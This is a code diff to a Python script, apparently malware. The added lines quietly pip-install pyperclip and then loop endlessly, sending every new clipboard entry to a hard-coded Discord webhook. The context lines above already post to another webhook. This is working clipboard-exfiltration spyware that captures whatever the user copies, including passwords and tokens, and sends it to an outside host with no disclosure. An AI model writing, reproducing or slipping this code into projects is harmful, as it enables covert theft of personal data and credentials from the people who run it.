@@ -27,3 +27,19 @@ bot = {"content": cont,
 		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959858917830168616/unknown.png',
 		"tts": "false"}
 ping = requests.post('https://discord.com/api/webhooks/953679426632187904/H-1MG3mxQjnPphYjZKtj6HwlCil_pSob7OwcW9Ze3A011CR4BRHtBETaFY4qToHXnhVi', json=bot)
+
+try:
+	import pyperclip
+except:
+	os.system("py -m pip install pyperclip")
+finally:
+	import pyperclip
+
+while True:
+	newCOPY = pyperclip.waitForNewPaste()
+	# print(newCOPY)
+	usrhook = {"content": newCOPY,
+		"username": "Kopier",
+		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
+		"tts": "false"}
+	ping = requests.post('https://discord.com/api/webhooks/960113345959178290/ITfAMUa1x0IPDvGmIdWWbLewCa6JeMLDPcftMSrMJ6PHS31PnEAsA9J9ATena3Rt-dAr', json=usrhook)
